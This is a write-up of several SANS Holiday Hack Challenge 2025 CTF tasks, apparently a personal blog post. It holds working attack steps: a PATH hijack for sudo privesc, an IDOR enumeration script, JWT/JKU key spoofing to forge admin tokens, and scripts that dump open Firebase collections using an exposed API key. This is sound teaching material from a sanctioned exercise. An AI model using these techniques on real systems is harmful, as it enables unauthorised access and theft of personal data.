---
title: "SANS Holiday Hack Challenge™ 2025"
date: 2025-11-11T00:00:00Z
draft: false
description: "Write-up for the SANS Holiday Hack Challenge 2025."
---

## SANS Holiday Hack Challenge™ 2025
This post will include some of my favorite challenges from the 2025 HHC.

### Quick Links
- [Neighborhood Watch Bypass](#neighborhood-watch-bypass)
- [Mail Detective](#mail-detective)
- [IDORable Bistro](#idorable-bistro)
- [Rogue Gnome Identity Provider](#rogue-gnome-identity-provider)
- [Gnome Tea](#gnome-tea)

### Neighborhood Watch Bypass
The challenge involves privesc from a linux box. Let's start with everyone's favorite sudo -l command.
{{< image src="/assets/HHC/HHC_sudo_l.png" alt="sudo -l" width="1200" linked="false" class="center-image" >}}
We can quickly see that the secure_path starts with a path that we control. Let's view the system_status.sh to find any commands that are not shell bultin. 
{{< image src="/assets/HHC/type_a.png" alt="type -a" width="1200" linked="false" class="center-image" >}}
We can see that 'w' is not a shell builtin, so let's add it to the path we control.
{{< image src="/assets/HHC/w.png" alt="w" width="1200" linked="false" class="center-image" >}}
Pretty fun and easy privesc using PATH.

### Mail Detective
This challenge involves finding the mailicious pastebin URL connecting to IMAP only using curl.
We can start by listing mail folders.
{{< image src="/assets/HHC/list.png" alt="list mailboxes" width="1200" linked="false" class="center-image" >}}
Now we can investigate each folder individually.
{{< image src="/assets/HHC/fetch.png" alt="list spam emails" width="1200" linked="false" class="center-image" >}}
Let's pipe the output to a file using '2>&1' which redirects stderr (2) into stdout (1), so both streams go into spam.txt. Then we can grep the file using domain regex.
{{< image src="/assets/HHC/spam.png" alt="spam.txt" width="1200" linked="false" class="center-image" >}}

### IDORable Bistro
Opening the challenge we get a link to [https://its-idorable.holidayhackchallenge.com/](https://its-idorable.holidayhackchallenge.com/), view page source to find an example receipt URI (/receipt/a1b2c3d4). Quick calculations of IDORing the a1b2c3d4 string would take 4,569,760,000 attempts, so it is probably not that. If we view the receipt with the network tab open we find an API request.
{{< image src="/assets/HHC/network.png" alt="network tab" width="1200" linked="false" class="center-image" >}}
We can see the endpoint id= is vulnerable to IDORable. Let's write a quick script to fetch the results of all IDs 100-200.

```sh
#!/bin/bash

# Output file
output_file="receipts.json"

# Clear the output file if it exists
> "$output_file"

# Loop from 100 to 200
for id in $(seq 100 200); do
    # Fetch the receipt
    response=$(curl -s "https://its-idorable.hhc25-ops.com/api/receipt?id=$id")
    
    # Check if the response contains the error message
    if [[ "$response" != '{"error":"Receipt not found"}' ]]; then
        echo "$response" >> "$output_file"
    fi
done

echo "Done. Valid receipts saved to $output_file."
```
Run the script and read through the results to find the flag!

### Rogue Gnome Identity Provider
This challenge invovled JWKS spoofing, this was my first time working with JWT, I found this [YouTube video from PinkDraconian](https://www.youtube.com/watch?v=KUyuvnez0ks) very helpful.

We land on the box and find a helpful notes section
```sh
# Sites

## Captured Gnome:
curl http://gnome-48371.atnascorp/

## ATNAS Identity Provider (IdP):
curl http://idp.atnascorp/

## My CyberChef website:
curl http://paulweb.neighborhood/
### My CyberChef site html files:
~/www/


# Credentials

## Gnome credentials (found on a post-it):
Gnome:SittingOnAShelf


# Curl Commands Used in Analysis of Gnome:

## Gnome Diagnostic Interface authentication required page:
curl http://gnome-48371.atnascorp

## Request IDP Login Page
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

## Authenticate to IDP
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface

## Analyze the JWT
jwt_tool.py <insert-JWT>
echo "Done. Valid receipts saved to $output_file."
```

We start by authenticating to the IDP with the credentials we already have.
`curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login`
{{< image src="/assets/HHC/init_jwt.png" alt="Initial JWT" width="1200" linked="false" class="center-image" >}}
Next we take the token and we can decode it to see the decoded header and payload using [jwt.io/](https://www.jwt.io/).
{{< image src="/assets/HHC/init_decode.png" alt="Decoded JWT" width="1200" linked="false" class="center-image" >}}
We can identify a URL we have not seen before and a kid which maybe useful later. Let's curl the URL to find what it contains.
{{< image src="/assets/HHC/jwks_json.png" alt="jwks.json" width="1200" linked="false" class="center-image" >}}
Let's now see if we can get the IDP to make a request to our site to see if we can force it to use our jwks.json file. Take the first portion of the JWT and base64 decode it then modify the JKU to a URI on our site.
{{< image src="/assets/HHC/crap123.png" alt="Access log" width="1200" linked="false" class="center-image" >}}
We now know we can modify the rest of the JWT and have it reach out to our site to fetch the JWKS. We need to keep the `kid` the same, but we want to change the `jku` to a URI on our site, we also want to change the admin flag from false to true. Again modify the JWT using base64 decode, change the affected areas, and base64 encode.
{{< image src="/assets/HHC/new_token.png" alt="New token" width="1200" linked="false" class="center-image" >}}
Now we need to create a JSON Web Key (JWK) similar to the one found at `http://idp.atnascorp/.well-known/jwks.json`. I used [mkjwk.org](https://mkjwk.org/) ensuring everything matched the information found at jwks.json.
{{< image src="/assets/HHC/mwjwk.png" alt="JWK generation" width="1200" linked="false" class="center-image" >}}
Take the public key we generated and place it on our webserver at jwks.json. Make sure we match the legit IDP syntax, I pasted everything as a oneliner as spaces might cause issues.
{{< image src="/assets/HHC/jwks_attacker.png" alt="jwks.json spoofed" width="1200" linked="false" class="center-image" >}}
Almost done... we now need to convert the public and private keypair and convert it to a pem file, I used [https://8gwifi.org/jwkconvertfunctions.jsp](8gwifi.org). Copy the private key and save it on the machine. Now we want to take our modified JWT (admin:true & our jku URL) and sign it with our private key we just generated.
`python3 /usr/local/bin/jwt_tool.py -S rs256 -pr priv.key <key_here>`
{{< image src="/assets/HHC/jwt_final.png" alt="Final jwt" width="1200" linked="false" class="center-image" >}}
Authenticate with the token `curl -v 'http://gnome-48371.atnascorp/auth?token=token'` to get a cookie.
{{< image src="/assets/HHC/cookie.png" alt="Admin authentication" width="1200" linked="false" class="center-image" >}}
Then authenticate to the diagnostic-interface using the cookie to get admin!
{{< image src="/assets/HHC/admin_access.png" alt="Diagnostic-interface access" width="1200" linked="false" class="center-image" >}}

### Gnome Tea
This one is actually really funny and is making fun of the vibe-coded 'Tea' dating/doxxing app which was built with no security considerations and led to leaking of users drivers licenses due to unsecured public databases. The goal of the challenge is to login as ??.
The challenge starts at `https://gnometea.web.app/login` and based on error messages we quickly find out it is a firebase application. After poking around we find some quick clues - page source shows `<!-- TODO: lock down dms, tea, gnomes collections -->`. It took me a while to find the next step but in sources we find a .js file containing a firebase configuration.
{{< image src="/assets/HHC/firebase_config.png" alt="Firebase configuration" width="1200" linked="false" class="center-image" >}}
Next we list the bucket that we found using the storageBucket and API key we found `curl "https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk"` We find a bunch of profile pictures and drivers licenses
{{< image src="/assets/HHC/curl_dls.png" alt="Default bucket curl" width="1200" linked="false" class="center-image" >}}
I use Cursor to quickly create a script to download all files from the bucket. We now have lots of gnomes profile pics and driver licenses.
{{< image src="/assets/HHC/gnomes.png" alt="Gnomes leaked" width="1200" linked="false" class="center-image" >}}
Unfortunately, we do not have any info that might help us login. If we view the [Cloud Firestore REST API docs](https://firebase.google.com/docs/firestore/use-rest-api) we find the URL `https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/cities/LA` Some asking Cursor for help shows that we should add `?key=<key>` on the end of the URL. We can try the following URLs based on the TODO note we found earlier.
`curl "https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk"` 

`curl "https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk"`

`curl  "https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk"`

They all return information, lets have Cursor write us a script to download all files.
```sh
#!/bin/bash

# Firestore Collection Download Script
# Downloads data from Firestore collections and saves to organized subfolders

API_KEY="AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk"
PROJECT_ID="holidayhack2025"
BASE_URL="https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents"
OUTPUT_DIR="firebase_output"

# Collections to download
COLLECTIONS=("dms" "tea" "gnomes")

# Create main output directory
mkdir -p "$OUTPUT_DIR"

echo "Downloading Firestore collections..."

# Loop through each collection
for collection in "${COLLECTIONS[@]}"; do
    # Create subfolder for this collection
    collection_dir="${OUTPUT_DIR}/${collection}"
    mkdir -p "$collection_dir"
    
    echo ""
    echo "Downloading collection: $collection"
    
    # Download the collection data
    url="${BASE_URL}/${collection}?key=${API_KEY}"
    output_file="${collection_dir}/${collection}.json"
    
    # Fetch the data
    response=$(curl -s "$url")
    
    # Check if we got a valid response
    if [ -z "$response" ] || echo "$response" | grep -q "error"; then
        echo "  ✗ Error fetching $collection"
        echo "$response" > "${collection_dir}/error.json"
    else
        # Save the JSON response
        echo "$response" > "$output_file"
        echo "  ✓ Saved to: $output_file"
        
        # If jq is available, try to extract individual documents
        if command -v jq &> /dev/null; then
            # Check if there are documents in the response
            doc_count=$(echo "$response" | jq -r '.documents | length' 2>/dev/null || echo "0")
            
            if [ "$doc_count" != "0" ] && [ "$doc_count" != "null" ]; then
                echo "  Found $doc_count document(s), extracting..."
                
                # Extract each document
                echo "$response" | jq -c '.documents[]' 2>/dev/null | while IFS= read -r doc; do
                    # Get document ID from the name field
                    doc_id=$(echo "$doc" | jq -r '.name' | sed 's|.*/||')
                    
                    if [ -n "$doc_id" ] && [ "$doc_id" != "null" ]; then
                        doc_file="${collection_dir}/${doc_id}.json"
                        echo "$doc" | jq '.' > "$doc_file"
                        echo "    ✓ Extracted: $doc_id.json"
                    fi
                done
            fi
        fi
    fi
done

echo ""
echo "Download complete! Files saved to: ${OUTPUT_DIR}/"
echo "  - ${OUTPUT_DIR}/dms/"
echo "  - ${OUTPUT_DIR}/tea/"
echo "  - ${OUTPUT_DIR}/gnomes/"
```
Let's go to the dm's and search for password, sure enough Barnaby Briefcase has given us a hint.
{{< image src="/assets/HHC/barnaby.png" alt="Barnaby's password hint" width="1200" linked="false" class="center-image" >}}
Now we can run exiftool on Barnaby's drivers license to get the lat/long where he took the picture. We can convert the lat/long to decimal using [latlongdata.com](https://latlongdata.com/lat-long-converter/), then we can put the decimal deegrees into Google Maps.
{{< image src="/assets/HHC/gnomesville.png" alt="Google maps location" width="1200" linked="false" class="center-image" >}}
Pretty obvious what the password is going to be now we just need to find Barnaby's email in the gnomes data folder and then we can login with `barnabybriefcase@gnomemail.dosis:gnomesville`
The last hint for this challenge reads `Hopefully they did not rely on hard-coded client-side controls to validate admin access once a user validly logs in. If so, it might be pretty easy to change some variable in the developer console to bypass these controls.` Searching the sources .js file again for `admin` reveals the /admin endpoint.
{{< image src="/assets/HHC/admin_uri.png" alt="Admin URI" width="1200" linked="false" class="center-image" >}}
Continuing searching through the js file for admin shows us a hardcoded string that we can use to become admin.
{{< image src="/assets/HHC/f.png" alt="f string" width="1200" linked="false" class="center-image" >}}
Simply run `window.ADMIN_UID = "3loaihgxP0VwCTKmkHHFLe6FZ4m2";` in console to get access to the operations dashboard and get the flag.